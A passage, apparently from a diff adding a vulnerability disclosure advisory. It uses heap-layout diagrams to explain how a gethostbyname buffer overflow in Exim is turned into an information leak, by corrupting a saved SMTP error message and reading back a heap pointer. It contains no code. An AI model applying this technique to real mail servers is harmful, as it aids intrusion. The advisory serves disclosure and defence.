+ ... | gethostbyname buffer |p|s|f|b|F|B| next free chunk | ...
+-----|----------------------|---+-------------------------|-----
+     |                         X|
+     |------------------------->|
+               overflow
+
+
+As a result, this artificially-enlarged free chunk overlaps another
+block of memory, where Exim saves the error message "503 sender not yet
+given\r\n" for later use:
+
+
+                            |< malloc_chunk
+                            |
+-----|----------------------|-----------------------------|----------+----|-----
+ ... | gethostbyname buffer |p|s|f|b|F|B| real free chunk | error message | ...
+-----|----------------------|-----------------------------|----------+----|-----
+                            |                                        |
+                            |<-------------------------------------->|
+                                 artificially enlarged free chunk
+
+
+Then, we partially allocate the artificially-enlarged free chunk,
+thereby splitting it in two: the newly allocated chunk, and a smaller,
+free chunk (the remainder from the split). The malloc_chunk header for
+this remaining free chunk overwrites the very beginning of the saved
+error message with a pointer to the heap (the fd_nextsize pointer):
+
+
+                            |< malloc_chunk       |< malloc_chunk
+                            |                     |
+-----|----------------------|---------------------+-------|----------+----|-----
+ ... | gethostbyname buffer |p|s|f|b|F|B| aaaaaaa |p|s|f|b|F|B| r message | ...
+-----|----------------------|---------------------+-------|----------+----|-----
+                            |                     |        X         |
+                            |<------------------->|<---------------->|
+                                allocated chunk        free chunk
+
+
+Finally, we send an invalid SMTP command to Exim, and retrieve the
+fd_nextsize heap pointer from Exim's SMTP response, which includes the
+corrupted error message. This effectively turns gethostbyname's buffer
+overflow into an information leak; moreover, it allows us to distinguish
+between 32-bit and 64-bit machines.
+
+
+--[ 6 - Acknowledgments ]-----------------------------------------------------
+
+We would like to thank Alexander Peslyak of the Openwall Project for his
+help with the disclosure process of this vulnerability.
+
